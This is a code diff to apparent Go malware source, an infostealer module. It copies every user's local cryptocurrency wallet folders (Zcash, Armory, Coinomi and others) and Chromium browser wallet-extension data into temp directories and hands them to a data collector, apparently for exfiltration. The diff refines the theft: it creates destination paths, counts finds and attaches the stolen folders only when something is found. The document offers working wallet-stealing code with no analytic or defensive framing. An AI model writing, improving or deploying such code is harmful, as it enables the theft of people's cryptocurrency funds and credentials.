@@ -19,8 +19,9 @@ func Run(dataCollector *collector.DataCollector) {
 func Local(dataCollector *collector.DataCollector) {
 	users := hardware.GetUsers()
 	tempDir := fmt.Sprintf("%s\\wallets-temp", os.TempDir())
-	defer os.RemoveAll(tempDir)
 	found := ""
+	foundCount := 0
+	
 	Paths := map[string]string{
 		"Zcash":        "\\Zcash",
 		"Armory":       "\\Armory",
@@ -34,6 +35,9 @@ func Local(dataCollector *collector.DataCollector) {
 		"Coinomi":      "\\Coinomi\\Coinomi\\wallets",
 	}
 
+	os.MkdirAll(tempDir, os.ModePerm)
+	defer os.RemoveAll(tempDir)
+
 	for _, user := range users {
 		userPath := fmt.Sprintf("%s\\AppData\\Roaming\\", user)
 
@@ -42,28 +46,33 @@ func Local(dataCollector *collector.DataCollector) {
 			if !fileutil.IsDir(path) {
 				continue
 			}
-			if err := fileutil.Copy(path, fmt.Sprintf("%s\\%s\\%s", tempDir, strings.Split(user, "\\")[2], name)); err != nil {
+			
+			destPath := fmt.Sprintf("%s\\%s\\%s", tempDir, strings.Split(user, "\\")[2], name)
+			os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
+			
+			if err := fileutil.Copy(path, destPath); err != nil {
 				continue
 			}
 
 			found += fmt.Sprintf("\n✅ %s - %s", strings.Split(user, "\\")[2], name)
+			foundCount++
 		}
 	}
 
-	if found == "" {
-		return
-	}
-
-	if len(found) > 4090 {
+	if len(found) > 4000 {
 		found = "Too many wallets to list."
 	}
 
 	// Add local wallets data to collector
 	walletsInfo := map[string]interface{}{
-		"WalletsFound": found,
+		"LocalWalletsFound": found,
+		"LocalWalletsCount": foundCount,
 	}
 	dataCollector.AddData("local_wallets", walletsInfo)
-	dataCollector.AddDirectory("local_wallets", tempDir, "local_wallets_data")
+	
+	if foundCount > 0 {
+		dataCollector.AddDirectory("local_wallets", tempDir, "local_wallets_data")
+	}
 }
 
 func Extensions(dataCollector *collector.DataCollector) {
@@ -129,6 +138,7 @@ func Extensions(dataCollector *collector.DataCollector) {
 	users := hardware.GetUsers()
 	browsersPath := browsers.GetChromiumBrowsers()
 	var profilesPaths []browsers.Profile
+	
 	for _, user := range users {
 		for name, path := range browsersPath {
 			path = fmt.Sprintf("%s\\%s", user, path)
@@ -180,8 +190,11 @@ func Extensions(dataCollector *collector.DataCollector) {
 	}
 
 	tempDir := fmt.Sprintf("%s\\extensions-temp", os.TempDir())
-	defer os.RemoveAll(tempDir)
 	found := ""
+	foundCount := 0
+	
+	os.MkdirAll(tempDir, os.ModePerm)
+	defer os.RemoveAll(tempDir)
 
 	for _, profile := range profilesPaths {
 		for name, path := range Paths {
@@ -190,26 +203,30 @@ func Extensions(dataCollector *collector.DataCollector) {
 				continue
 			}
 
-			err := fileutil.Copy(path, fmt.Sprintf("%s\\%s\\%s", tempDir, profile.Browser.User, name))
+			destPath := fmt.Sprintf("%s\\%s\\%s", tempDir, profile.Browser.User, name)
+			os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
+			
+			err := fileutil.Copy(path, destPath)
 			if err != nil {
 				continue
 			}
 			found += fmt.Sprintf("\n✅ %s - %s", profile.Browser.User, name)
+			foundCount++
 		}
 	}
 
-	if found == "" {
-		return
-	}
-
-	if len(found) > 4090 {
+	if len(found) > 4000 {
 		found = "Too many extensions to list."
 	}
 
 	// Add wallet extensions data to collector
 	extensionsInfo := map[string]interface{}{
-		"ExtensionsFound": found,
+		"WalletExtensionsFound": found,
+		"WalletExtensionsCount": foundCount,
 	}
 	dataCollector.AddData("wallet_extensions", extensionsInfo)
-	dataCollector.AddDirectory("wallet_extensions", tempDir, "wallet_extensions_data")
+	
+	if foundCount > 0 {
+		dataCollector.AddDirectory("wallet_extensions", tempDir, "wallet_extensions_data")
+	}
 }
